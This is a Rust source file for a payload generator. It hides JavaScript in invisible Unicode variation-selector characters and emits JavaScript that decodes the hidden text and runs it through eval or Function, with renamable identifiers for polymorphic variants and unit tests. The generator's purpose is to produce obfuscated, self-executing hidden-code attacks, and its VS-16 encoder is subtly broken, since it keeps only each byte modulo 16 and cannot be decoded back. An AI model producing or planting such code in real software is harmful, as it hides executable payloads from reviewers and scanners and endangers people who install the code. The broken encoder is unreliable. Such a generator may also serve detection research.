//! GlassWare Payload Template
//!
//! Unicode steganography + decoder function + eval execution
//! This template generates GlassWare-style attacks with polymorphic variations.

use super::{PayloadTemplate, VariableSlot, SlotType, replace_slots};
use std::collections::HashMap;

/// GlassWare payload template
///
/// Structure:
/// 1. Steganographic payload encoded in Unicode Variation Selectors
/// 2. Decoder function that extracts and decodes the payload
/// 3. Dynamic execution via eval/Function
pub struct GlassWareTemplate {
    /// The malicious payload to encode (e.g., "console.log('pwned')")
    payload: String,
}

impl GlassWareTemplate {
    /// Create a new GlassWare template with the given payload
    pub fn new(payload: &str) -> Self {
        Self {
            payload: payload.to_string(),
        }
    }

    /// Encode bytes as VS codepoints (VS-16 range: U+FE00-U+FE0F)
    pub fn encode_vs16(&self, bytes: &[u8]) -> String {
        bytes
            .iter()
            .map(|&byte| {
                let cp = 0xFE00 + (byte % 16) as u32;
                char::from_u32(cp).unwrap()
            })
            .collect()
    }

    /// Encode bytes as VS codepoints (VS-17 range: U+E0100-U+E01EF)
    pub fn encode_vs17(&self, bytes: &[u8]) -> String {
        bytes
            .iter()
            .map(|&byte| {
                let cp = 0xE0100 + (byte as u32);
                char::from_u32(cp).unwrap()
            })
            .collect()
    }

    /// Get the steganographic payload as VS codepoints
    fn get_stego_payload(&self, use_vs17: bool) -> String {
        let bytes = self.payload.as_bytes();
        if use_vs17 {
            self.encode_vs17(bytes)
        } else {
            self.encode_vs16(bytes)
        }
    }
}

impl PayloadTemplate for GlassWareTemplate {
    fn name(&self) -> &str {
        "glassware"
    }

    fn description(&self) -> &str {
        "GlassWare-style attack: Unicode steganography + decoder + eval execution"
    }

    fn base_payload(&self) -> String {
        r#"// GlassWare Payload Template
// Steganographic payload: {stego_payload}

const {decoder_name} = (chars) => {{
    return chars.map(c => String.fromCodePoint(
        c.codePointAt(0) - {vs_offset}
    )).join('');
}};

const {extractor_name} = (content) => {{
    const codepoints = [];
    for (const char of content) {{
        const cp = char.codePointAt(0);
        if (cp >= {vs_range_start} && cp <= {vs_range_end}) {{
            codepoints.push(char);
        }}
    }}
    return codepoints;
}};

const {payload_var} = {extractor_name}(`{stego_payload}`);
const {decoded_var} = {decoder_name}({payload_var});
{exec_pattern}
"#.to_string()
    }

    fn get_slots(&self) -> Vec<VariableSlot> {
        vec![
            VariableSlot::new(
                "decoder_name",
                SlotType::VariableName,
                "_decoder",
                "Name of the decoder function",
            ),
            VariableSlot::new(
                "extractor_name",
                SlotType::VariableName,
                "_extract",
                "Name of the extraction function",
            ),
            VariableSlot::new(
                "payload_var",
                SlotType::VariableName,
                "_payload",
                "Variable holding extracted VS codepoints",
            ),
            VariableSlot::new(
                "decoded_var",
                SlotType::VariableName,
                "_decoded",
                "Variable holding decoded payload",
            ),
            VariableSlot::new(
                "vs_offset",
                SlotType::NumericConstant,
                "0xFE00",
                "Offset for VS codepoint decoding (0xFE00 or 0xE0100)",
            ),
            VariableSlot::new(
                "vs_range_start",
                SlotType::NumericConstant,
                "0xFE00",
                "Start of VS range for detection",
            ),
            VariableSlot::new(
                "vs_range_end",
                SlotType::NumericConstant,
                "0xFE0F",
                "End of VS range for detection",
            ),
            VariableSlot::new(
                "stego_payload",
                SlotType::UnicodeVariant,
                "",
                "The steganographic payload (auto-generated)",
            ),
            VariableSlot::new(
                "exec_pattern",
                SlotType::ControlFlow,
                "eval(_decoded);",
                "Execution pattern (eval, Function, etc.)",
            ),
        ]
    }

    fn generate(&self, slot_values: &HashMap<String, String>) -> String {
        let mut slots = slot_values.clone();
        
        // Auto-generate stego payload if not provided
        if !slots.contains_key("stego_payload") {
            let use_vs17 = slots.get("vs_offset")
                .map(|v| v.contains("0xE0100"))
                .unwrap_or(false);
            slots.insert("stego_payload".to_string(), self.get_stego_payload(use_vs17));
        }

        // Set VS range based on offset
        if let Some(offset) = slots.get("vs_offset") {
            if offset.contains("0xE0100") {
                slots.entry("vs_range_start".to_string())
                    .or_insert("0xE0100".to_string());
                slots.entry("vs_range_end".to_string())
                    .or_insert("0xE01EF".to_string());
            } else {
                slots.entry("vs_range_start".to_string())
                    .or_insert("0xFE00".to_string());
                slots.entry("vs_range_end".to_string())
                    .or_insert("0xFE0F".to_string());
            }
        }

        replace_slots(&self.base_payload(), &slots)
    }

    fn decoder_logic(&self) -> String {
        r#"const decoder = (chars) => {
    // Map each VS codepoint back to original byte
    return chars.map(c => String.fromCodePoint(
        c.codePointAt(0) - 0xFE00  // or 0xE0100 for VS-17
    )).join('');
};"#.to_string()
    }

    fn exec_pattern(&self) -> String {
        "eval(_decoded);".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_glassware_template_creation() {
        let template = GlassWareTemplate::new("console.log('pwned')");
        assert_eq!(template.name(), "glassware");
        assert!(template.description().contains("GlassWare"));
    }

    #[test]
    fn test_glassware_base_payload() {
        let template = GlassWareTemplate::new("test");
        let payload = template.base_payload();
        
        assert!(payload.contains("{stego_payload}"));
        assert!(payload.contains("{decoder_name}"));
        assert!(payload.contains("{exec_pattern}"));
    }

    #[test]
    fn test_glassware_generate() {
        let template = GlassWareTemplate::new("console.log('pwned')");
        let mut slots = HashMap::new();
        slots.insert("decoder_name".to_string(), "d3c0d3r".to_string());
        slots.insert("exec_pattern".to_string(), "Function(_decoded)();".to_string());

        let payload = template.generate(&slots);
        
        assert!(payload.contains("d3c0d3r"));
        assert!(payload.contains("Function(_decoded)();"));
    }

    #[test]
    fn test_glassware_vs16_encoding() {
        let template = GlassWareTemplate::new("AB");
        // 'A' = 0x41 = 65, 65 % 16 = 1, so U+FE01
        // 'B' = 0x42 = 66, 66 % 16 = 2, so U+FE02
        let encoded = template.encode_vs16(b"AB");
        assert!(encoded.contains('\u{FE01}'));
        assert!(encoded.contains('\u{FE02}'));
    }

    #[test]
    fn test_glassware_vs17_encoding() {
        let template = GlassWareTemplate::new("AB");
        // 'A' = 0x41 = 65, so U+E0100 + 65 = U+E0141
        // 'B' = 0x42 = 66, so U+E0100 + 66 = U+E0142
        let encoded = template.encode_vs17(b"AB");
        assert!(encoded.contains('\u{E0141}'));
        assert!(encoded.contains('\u{E0142}'));
    }

    #[test]
    fn test_glassware_slots() {
        let template = GlassWareTemplate::new("test");
        let slots = template.get_slots();
        
        assert!(slots.iter().any(|s| s.id == "decoder_name"));
        assert!(slots.iter().any(|s| s.id == "extractor_name"));
        assert!(slots.iter().any(|s| s.id == "stego_payload"));
        assert!(slots.iter().any(|s| s.id == "exec_pattern"));
    }

    #[test]
    fn test_glassware_decoder_logic() {
        let template = GlassWareTemplate::new("test");
        let decoder = template.decoder_logic();
        
        assert!(decoder.contains("codePointAt"));
        assert!(decoder.contains("fromCodePoint"));
    }
}
